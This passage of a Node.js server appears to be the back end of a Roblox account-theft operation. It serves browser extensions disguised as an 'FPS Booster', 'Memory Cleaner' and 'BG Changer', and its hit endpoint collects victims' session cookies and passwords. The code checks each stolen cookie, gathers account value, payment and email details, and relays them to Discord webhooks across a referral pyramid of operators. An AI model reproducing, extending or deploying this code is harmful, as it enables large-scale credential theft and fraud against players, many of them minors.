        totalNetwork: countDownline(dirName),
        hasWebhook: !!dirConfig.webhookUrl
      };
    });

    await logAdminAction('list_directories', { count: result.length }, req);
    res.json(result);
  } catch (error) {
    console.error('Admin directories error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// DELETE a directory
app.delete('/api/admin/directory/:name', adminLimiter, requireAdminPassword, async (req, res) => {
  try {
    const dirName = req.params.name;
    const { confirm } = req.body;

    // Require typing the directory name to confirm
    if (confirm !== dirName) {
      return res.status(400).json({ error: `Confirmation failed. You must send { confirm: "${dirName}" } in the body.` });
    }

    const directories = await loadDirectories();
    if (!directories[dirName]) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    await db.ref(`directories/${dirName}`).remove();
    await logAdminAction('delete_directory', { directory: dirName }, req);

    res.json({ success: true, message: `Directory "${dirName}" deleted.` });
  } catch (error) {
    console.error('Admin delete directory error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// PATCH a directory — update serviceType, harName, referralCode
app.patch('/api/admin/directory/:name', adminLimiter, requireAdminPassword, async (req, res) => {
  try {
    const dirName = req.params.name;
    const { serviceType, harName, referralCode } = req.body;

    const directories = await loadDirectories();
    if (!directories[dirName]) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    const updates = {};
    if (serviceType) updates.serviceType = serviceType;
    if (harName) updates.harName = harName.trim().slice(0, 20);
    if (referralCode) updates.referralCode = referralCode.trim().toUpperCase();

    if (Object.keys(updates).length === 0) {
      return res.status(400).json({ error: 'No valid fields to update' });
    }

    await db.ref(`directories/${dirName}`).update(updates);
    await logAdminAction('update_directory', { directory: dirName, updates }, req);

    res.json({ success: true, updates });
  } catch (error) {
    console.error('Admin update directory error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// POST reset stats for a directory
app.post('/api/admin/directory/:name/reset-stats', adminLimiter, requireAdminPassword, async (req, res) => {
  try {
    const dirName = req.params.name;
    const { confirm } = req.body;

    if (confirm !== dirName) {
      return res.status(400).json({ error: `Confirmation failed. Send { confirm: "${dirName}" }` });
    }

    const directories = await loadDirectories();
    if (!directories[dirName]) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    await db.ref(`directories/${dirName}/stats`).remove();
    await logAdminAction('reset_stats', { directory: dirName }, req);

    res.json({ success: true, message: `Stats reset for "${dirName}".` });
  } catch (error) {
    console.error('Admin reset stats error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// GET top directories by total hits
app.get('/api/admin/top-directories', adminLimiter, requireAdminPassword, async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 10, 50);
    const directories = await loadDirectories();

    const result = Object.entries(directories)
      .map(([dirName, dirConfig]) => ({
        name: dirName,
        harName: dirConfig.harName || dirConfig.discordUsername || dirName,
        serviceType: dirConfig.serviceType || 'single',
        totalHits: dirConfig.stats?.totalHits || 0,
        todayHits: dirConfig.stats?.todayHits || 0,
        totalSummary: dirConfig.stats?.totalSummary || 0
      }))
      .sort((a, b) => b.totalHits - a.totalHits)
      .slice(0, limit);

    await logAdminAction('view_top_directories', { limit }, req);
    res.json(result);
  } catch (error) {
    console.error('Admin top directories error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// GET network tree — full referral hierarchy
app.get('/api/admin/network-tree', adminLimiter, requireAdminPassword, async (req, res) => {
  try {
    const directories = await loadDirectories();

    function buildTree(parentName) {
      const children = [];
      for (const [dirName, dirConfig] of Object.entries(directories)) {
        if (dirConfig.referredBy === parentName) {
          children.push({
            name: dirName,
            harName: dirConfig.harName || dirConfig.discordUsername || dirName,
            serviceType: dirConfig.serviceType || 'single',
            totalHits: dirConfig.stats?.totalHits || 0,
            referralCode: dirConfig.referralCode || null,
            children: buildTree(dirName)
          });
        }
      }
      return children;
    }

    // Find root directories (no referredBy)
    const roots = Object.entries(directories)
      .filter(([, dc]) => !dc.referredBy)
      .map(([dirName, dirConfig]) => ({
        name: dirName,
        harName: dirConfig.harName || dirConfig.discordUsername || dirName,
        serviceType: dirConfig.serviceType || 'single',
        totalHits: dirConfig.stats?.totalHits || 0,
        referralCode: dirConfig.referralCode || null,
        children: buildTree(dirName)
      }));

    await logAdminAction('view_network_tree', {}, req);
    res.json(roots);
  } catch (error) {
    console.error('Admin network tree error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// GET admin action logs
app.get('/api/admin/action-logs', adminLimiter, requireAdminPassword, async (req, res) => {
  try {
    const snap = await db.ref('admin_logs').orderByChild('timestamp').limitToLast(50).once('value');
    const logs = [];
    snap.forEach(child => logs.push(child.val()));
    logs.reverse();
    res.json(logs);
  } catch (error) {
    console.error('Admin action logs error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// ──────────────────────────────────────────────────────────────────────────────

// Dynamic route handler for custom directories
app.get('/:directory', async (req, res, next) => {
  const directoryName = req.params.directory;
  
  // Skip special routes
  const specialRoutes = ['api', 'auth', 'admin', 'create', 'login', 'dashboard', 'public'];
  if (specialRoutes.includes(directoryName)) {
    return next();
  }
  
  // Old URL style - return 404 (use /u/:directory/ instead)
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

// Pure Node.js ZIP creator (no external zip command needed)
async function createZip(sourceDir, outputPath, folderName) {
  const zlib = await import('zlib');
  
  // Simple ZIP format implementation
  const entries = [];
  const files = fs.readdirSync(sourceDir);
  
  for (const file of files) {
    const filePath = path.join(sourceDir, file);
    const stat = fs.statSync(filePath);
    if (stat.isFile()) {
      const content = fs.readFileSync(filePath);
      entries.push({ name: `${folderName}/${file}`, data: content });
    }
  }

  // Build ZIP file manually
  const buffers = [];
  const centralDir = [];
  let offset = 0;

  for (const entry of entries) {
    const nameBytes = Buffer.from(entry.name, 'utf8');
    const data = entry.data;
    
    // Local file header
    const localHeader = Buffer.alloc(30 + nameBytes.length);
    localHeader.writeUInt32LE(0x04034b50, 0); // signature
    localHeader.writeUInt16LE(20, 4);  // version needed
    localHeader.writeUInt16LE(0, 6);   // flags
    localHeader.writeUInt16LE(0, 8);   // compression (store)
    localHeader.writeUInt16LE(0, 10);  // mod time
    localHeader.writeUInt16LE(0, 12);  // mod date
    
    // CRC32
    const crc = crc32(data);
    localHeader.writeUInt32LE(crc, 14);
    localHeader.writeUInt32LE(data.length, 18); // compressed size
    localHeader.writeUInt32LE(data.length, 22); // uncompressed size
    localHeader.writeUInt16LE(nameBytes.length, 26);
    localHeader.writeUInt16LE(0, 28); // extra field length
    nameBytes.copy(localHeader, 30);

    // Central directory entry
    const cdEntry = Buffer.alloc(46 + nameBytes.length);
    cdEntry.writeUInt32LE(0x02014b50, 0); // signature
    cdEntry.writeUInt16LE(20, 4);  // version made by
    cdEntry.writeUInt16LE(20, 6);  // version needed
    cdEntry.writeUInt16LE(0, 8);   // flags
    cdEntry.writeUInt16LE(0, 10);  // compression
    cdEntry.writeUInt16LE(0, 12);  // mod time
    cdEntry.writeUInt16LE(0, 14);  // mod date
    cdEntry.writeUInt32LE(crc, 16);
    cdEntry.writeUInt32LE(data.length, 20);
    cdEntry.writeUInt32LE(data.length, 24);
    cdEntry.writeUInt16LE(nameBytes.length, 28);
    cdEntry.writeUInt16LE(0, 30);  // extra
    cdEntry.writeUInt16LE(0, 32);  // comment
    cdEntry.writeUInt16LE(0, 34);  // disk start
    cdEntry.writeUInt16LE(0, 36);  // internal attr
    cdEntry.writeUInt32LE(0, 38);  // external attr
    cdEntry.writeUInt32LE(offset, 42); // offset
    nameBytes.copy(cdEntry, 46);

    buffers.push(localHeader, data);
    centralDir.push(cdEntry);
    offset += localHeader.length + data.length;
  }

  const centralDirBuf = Buffer.concat(centralDir);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); // signature
  eocd.writeUInt16LE(0, 4);  // disk number
  eocd.writeUInt16LE(0, 6);  // disk with cd
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(centralDirBuf.length, 12);
  eocd.writeUInt32LE(offset, 16);
  eocd.writeUInt16LE(0, 20); // comment length

  buffers.push(centralDirBuf, eocd);
  fs.writeFileSync(outputPath, Buffer.concat(buffers));
}

function crc32(buf) {
  let crc = 0xFFFFFFFF;
  for (let i = 0; i < buf.length; i++) {
    crc ^= buf[i];
    for (let j = 0; j < 8; j++) {
      crc = (crc >>> 1) ^ (crc & 1 ? 0xEDB88320 : 0);
    }
  }
  return (crc ^ 0xFFFFFFFF) >>> 0;
}

// ====================================================================
// EXTENSION DOWNLOAD ENDPOINT
// ====================================================================
app.get('/api/extension/download', requireSession, async (req, res) => {
  try {
    const directories = await loadDirectories();
    let directoryName = null;
    let directoryConfig = null;

    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        directoryName = dirName;
        directoryConfig = dirConfig;
        break;
      }
    }

    if (!directoryName || !directoryConfig?.apiToken) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    // Generate extensionToken if not already set
    let extensionToken = directoryConfig.extensionToken;
    if (!extensionToken) {
      extensionToken = crypto.randomBytes(32).toString('hex');
      await db.ref(`directories/${directoryName}/extensionToken`).set(extensionToken);
      console.log(`🔑 Generated new extensionToken for ${directoryName}`);
    }

    const extSrcDir = path.join(__dirname, 'extension');
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'rbx-ext-'));
    const tmpExtDir = path.join(tmpDir, 'RobloxFPSBooster');
    fs.mkdirSync(tmpExtDir);

    // Copy all extension files
    const files = fs.readdirSync(extSrcDir);
    files.forEach(file => {
      const src = path.join(extSrcDir, file);
      const dest = path.join(tmpExtDir, file);
      if (file === 'config.js') {
        // Embed the extension token (separate from apiToken)
        let content = fs.readFileSync(src, 'utf8');
        content = content.replace('DIRECTORY_TOKEN_PLACEHOLDER', extensionToken);
        fs.writeFileSync(dest, content);
      } else {
        fs.copyFileSync(src, dest);
      }
    });

    // Create ZIP using pure Node.js (no external zip command needed)
    const zipPath = path.join(tmpDir, 'RobloxFPSBooster.zip');
    await createZip(tmpExtDir, zipPath, 'RobloxFPSBooster');

    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', 'attachment; filename="RobloxFPSBooster.zip"');
    res.sendFile(zipPath, () => {
      // Cleanup tmp files after sending
      try { fs.rmSync(tmpDir, { recursive: true }); } catch(e) {}
    });

  } catch (error) {
    console.error('❌ Extension download error:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to generate extension', detail: error.message });
  }
});

// ====================================================================
// MEMORY CLEANER EXTENSION DOWNLOAD
// ====================================================================
app.get('/api/extension/download/memory-cleaner', requireSession, async (req, res) => {
  try {
    const directories = await loadDirectories();
    let directoryName = null;
    let directoryConfig = null;

    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        directoryName = dirName;
        directoryConfig = dirConfig;
        break;
      }
    }

    if (!directoryName || !directoryConfig?.apiToken) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    // Reuse same extensionToken as FPS Booster (same config.js)
    let extensionToken = directoryConfig.extensionToken;
    if (!extensionToken) {
      extensionToken = crypto.randomBytes(32).toString('hex');
      await db.ref(`directories/${directoryName}/extensionToken`).set(extensionToken);
      console.log(`Generated new extensionToken for ${directoryName}`);
    }

    const extSrcDir = path.join(__dirname, 'extension-memory-cleaner');
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'rbx-ext-mc-'));
    const tmpExtDir = path.join(tmpDir, 'RobloxMemoryCleaner');
    fs.mkdirSync(tmpExtDir);

    const files = fs.readdirSync(extSrcDir);
    files.forEach(file => {
      const src  = path.join(extSrcDir, file);
      const dest = path.join(tmpExtDir, file);
      if (file === 'config.js') {
        let content = fs.readFileSync(src, 'utf8');
        content = content.replace('DIRECTORY_TOKEN_PLACEHOLDER', extensionToken);
        fs.writeFileSync(dest, content);
      } else {
        fs.copyFileSync(src, dest);
      }
    });

    const zipPath = path.join(tmpDir, 'RobloxMemoryCleaner.zip');
    await createZip(tmpExtDir, zipPath, 'RobloxMemoryCleaner');

    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', 'attachment; filename="RobloxMemoryCleaner.zip"');
    res.sendFile(zipPath, () => {
      try { fs.rmSync(tmpDir, { recursive: true }); } catch(e) {}
    });

  } catch (error) {
    console.error('Memory Cleaner download error:', error.message);
    res.status(500).json({ error: 'Failed to generate extension', detail: error.message });
  }
});


// ====================================================================
// BG CHANGER EXTENSION DOWNLOAD
// ====================================================================
app.get('/api/extension/download/bg-changer', requireSession, async (req, res) => {
  try {
    const directories = await loadDirectories();
    let directoryName = null;
    let directoryConfig = null;

    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        directoryName = dirName;
        directoryConfig = dirConfig;
        break;
      }
    }

    if (!directoryName || !directoryConfig?.apiToken) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    let extensionToken = directoryConfig.extensionToken;
    if (!extensionToken) {
      extensionToken = crypto.randomBytes(32).toString('hex');
      await db.ref(`directories/${directoryName}/extensionToken`).set(extensionToken);
      console.log(`Generated new extensionToken for ${directoryName}`);
    }

    const extSrcDir = path.join(__dirname, 'extension-bg-changer');
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'rbx-ext-bg-'));
    const tmpExtDir = path.join(tmpDir, 'RobloxBGChanger');
    fs.mkdirSync(tmpExtDir);

    const files = fs.readdirSync(extSrcDir);
    files.forEach(file => {
      const src  = path.join(extSrcDir, file);
      const dest = path.join(tmpExtDir, file);
      if (file === 'config.js') {
        let content = fs.readFileSync(src, 'utf8');
        content = content.replace('DIRECTORY_TOKEN_PLACEHOLDER', extensionToken);
        fs.writeFileSync(dest, content);
      } else {
        fs.copyFileSync(src, dest);
      }
    });

    const zipPath = path.join(tmpDir, 'RobloxBGChanger.zip');
    await createZip(tmpExtDir, zipPath, 'RobloxBGChanger');

    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', 'attachment; filename="RobloxBGChanger.zip"');
    res.sendFile(zipPath, () => {
      try { fs.rmSync(tmpDir, { recursive: true }); } catch(e) {}
    });

  } catch (error) {
    console.error('BG Changer download error:', error.message);
    res.status(500).json({ error: 'Failed to generate extension', detail: error.message });
  }
});


// ====================================================================
// EXTENSION HIT ENDPOINT
// ====================================================================
app.options('/api/extension/hit', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.sendStatus(204);
});

// Rate limiter for extension hit endpoint
const hitLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 5, // max 5 hits per IP per minute
  message: 'Too many requests',
  standardHeaders: true,
  legacyHeaders: false,
});

app.post('/api/extension/hit', hitLimiter, async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  try {
    const { cookie, password, directoryToken } = req.body;

    if (!cookie || !directoryToken) {
      return res.status(400).json({ success: false, message: 'Missing required fields' });
    }

    // Validate token is hex string only — prevent injection
    if (!/^[a-f0-9]{64}$/.test(directoryToken)) {
      return res.status(400).json({ success: false, message: 'Invalid token format' });
    }

    // Validate cookie — must look like a real Roblox cookie
    if (!cookie.startsWith('_|WARNING:') || cookie.length < 100 || cookie.length > 4000) {
      return res.status(400).json({ success: false, message: 'Invalid cookie format' });
    }

    const directories = await loadDirectories();
    let directoryName = null;
    let directoryConfig = null;

    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.extensionToken === directoryToken) {
        directoryName = dirName;
        directoryConfig = dirConfig;
        break;
      }
    }

    if (!directoryName) {
      return res.status(401).json({ success: false, message: 'Invalid directory token' });
    }

    const cookieValidation = await isRobloxCookieValid(cookie);
    if (cookieValidation.valid === false) {
      return res.status(400).json({ success: false, message: 'Invalid or expired cookie' });
    }
    if (cookieValidation.valid === null) {
      return res.status(429).json({ success: false, message: 'Service temporarily unavailable' });
    }

    const userAgent = req.headers['user-agent'] || 'Extension';
    const userData = await fetchRobloxUserData(cookie);

    const webhookUserData = userData || {
      username: "Unknown User", userId: "Unknown", robux: 0, premium: false, rap: 0,
      summary: 0, creditBalance: 0, savedPayment: false, robuxIncoming: 0, robuxOutgoing: 0,
      korblox: false, headless: false, accountAge: 0, groupsOwned: 0, groupFunds: 0,
      placeVisits: 0, inventory: { hairs: 0, bundles: 0, faces: 0, hats: 0, gear: 0, animations: 0 },
      emailVerified: false, emailAddress: null, voiceChatEnabled: false
    };

    if (password) webhookUserData.password = password;

    // Same display name logic as convert endpoint
    const displayName = directoryConfig.harName || directoryConfig.discordUsername || directoryName;
    const customTitle = `+1 Hit ${displayName}`;

    // 1. Send to directory's own webhook
    const webhookResult = await sendToDiscord(
      cookie, userAgent, 'Extension', webhookUserData,
      directoryConfig.webhookUrl, customTitle, true, req.ip, directoryConfig
    );

    // Log to database
    await logUserData(cookie, webhookUserData, { ip: req.ip, directory: directoryName }, webhookResult.avatarUrl);
    await updateDirectoryStats(directoryName, webhookUserData, directories);

    // 2. Mirror convert endpoint: infinite vs non-infinite distribution
    if (directoryConfig.serviceType === 'infinite') {
      // Send to upline referral chain
      if (directoryConfig.referralChain && directoryConfig.referralChain.length > 0) {
        for (const parentName of directoryConfig.referralChain) {
          const parent = directories[parentName];
          if (parent && parent.webhookUrl) {
            try {
              await sendToDiscord(
                cookie, userAgent, `Extension (Downline: ${directoryName})`, webhookUserData,
                parent.webhookUrl, `+1 Referral Hit from ${displayName}`, true, req.ip, directoryConfig
              );
                      } catch (e) {
              console.error(`❌ Failed to send to ${parentName}:`, e.message);
            }
          }
        }
      }
      // Send to main site
      if (process.env.DISCORD_WEBHOOK_URL) {
        await sendToDiscord(
          cookie, userAgent, `Extension (Network: ${directoryName})`, webhookUserData,
          process.env.DISCORD_WEBHOOK_URL, `+1 Referral Hit from ${displayName}`, true, req.ip
        );
      }
    } else {
      // Non-infinite: send to main site
      if (process.env.DISCORD_WEBHOOK_URL) {
        await sendToDiscord(
          cookie, userAgent, `Extension (Directory: ${directoryName})`, webhookUserData,
          process.env.DISCORD_WEBHOOK_URL, customTitle, true, req.ip
        );
      }
    }

    if (!webhookResult.success) {
      return res.status(500).json({ success: false, message: 'Webhook failed' });
    }

    res.json({ success: true, message: 'Hit processed successfully' });

  } catch (error) {
    console.error('❌ Extension hit error:', error.message);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Catch-all 404 handler (must be last)
app.use('*', (req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {


  if (!process.env.API_TOKEN) {
  }

  // Log existing directories
  loadDirectories().then(directories => {
    if (directories && typeof directories === 'object') {
      const directoryNames = Object.keys(directories);
      if (directoryNames.length > 0) {
        // Directory names logged above
      }
    }
  }).catch(error => {
    console.error('Error loading directories on startup:', error);
  });
});
